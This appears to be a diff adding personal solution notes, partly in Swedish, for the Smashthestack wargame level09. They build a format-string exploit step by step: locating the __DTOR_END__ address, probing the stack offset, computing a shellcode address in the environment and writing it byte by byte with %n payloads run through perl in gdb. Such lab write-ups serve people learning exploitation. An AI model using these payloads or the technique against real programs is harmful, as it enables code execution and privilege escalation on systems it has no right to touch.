@@ -1,0 +1,24 @@
+nm level09 | grep dtor -i
+# 080494d4 d __DTOR_END__
+
+./level09 "AAAA%4$p"
+# AAAA0x41414141
+
+gdb ./level09
+run `perl -e 'print "\xd4\x94\x04\x08\xd5\x94\x04\x08\xd6\x94\x04\x08\xd7\x94\x04\x08\%4\\$n\%5\\$n\%6\\$n\%7\\$n"'`
+# Program received signal SIGSEGV, Segmentation fault.
+# 0x10101010 in ?? ()
+
+Smashthestack.org har top-stack-adress: 0xbfffdfff
+Rensa env och lägg vår shellcode som enda env.
+Vår shellcode börjar då på: 0xbfffdfff - 4 - strlen(binary_path) - 1 - strlen(shellcode) = 0xbfffdfff - 5 - 30 - 15 = 0xBFFFDFCD
+
+Iteration #	Bytes skrivna		Mål		Diff.
+1		16			0xcd = 205	205 - 16 = 189
+2		205			0xdf = 223	223 - 205 = 18
+3		223			0xff = 255	255 - 223 = 32
+4		255			0xbf = 191	191 + 1 = 192(?)
+RESULT: 0xbfffdfcd
+
+run `perl -e 'print "\xd4\x94\x04\x08\xd5\x94\x04\x08\xd6\x94\x04\x08\xd7\x94\x04\x08\%189u\%4\\$n\%18u\%5\\$n\%32u\%6\\$n\%192u\%7\\$n"'`
+
